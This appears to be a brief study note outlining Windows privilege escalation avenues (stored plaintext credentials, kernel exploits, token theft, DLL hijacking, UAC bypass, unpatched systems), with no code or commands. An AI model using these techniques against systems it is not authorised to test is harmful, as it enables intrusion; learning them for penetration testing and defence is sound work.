# Windows Privilege Escalation

You are looking for LEADUP
- Lazy administrator -> text password, account that has higher privilege
- Exploitation -> kernel level exploit
- Access token -> forge, duplicate, or steal authorization token.
- DLL hijacking (Dynamic Link Library) -> DLL runs at the same privilege as its program.
-  User access control bypass
-  Patch level -> related to older OS that hasn't been patched.
